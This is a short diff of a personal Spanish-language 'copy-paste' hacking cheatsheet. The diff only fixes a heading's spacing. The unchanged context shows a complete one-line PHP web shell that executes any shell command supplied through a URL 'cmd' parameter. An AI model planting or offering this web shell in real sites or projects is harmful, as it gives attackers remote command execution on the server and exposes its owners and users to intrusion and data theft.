@@ -1,7 +1,7 @@
 # Cheatsheet
 Cosas copypaste
 
-#Web Shell PHP
+# Web Shell PHP
 
 ```
 <?php system($_GET[cmd]);?>
